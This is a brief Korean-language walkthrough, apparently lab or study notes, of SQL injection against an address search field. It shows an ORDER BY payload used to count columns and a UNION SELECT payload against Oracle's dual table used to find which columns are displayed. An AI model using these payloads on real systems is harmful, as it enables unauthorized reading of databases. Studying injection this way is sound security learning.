예상 쿼리문 : select * from address where addr like '%_addr_%';

검색창: 삼성동%' order by 1--
select * from address where addr like '%삼성동%' order by 1--
-> 이를 통해서 테이블의 컬럼 개수 파악 (5개)

검색창: 삼성동%' union select 'a','b',null,null,null from dual where '%'='
select * from address where addr like '%삼성동%' union select 'a','b',null,null,null from dual where '%'='%';
-> 사용할 수 있는 칸 파악
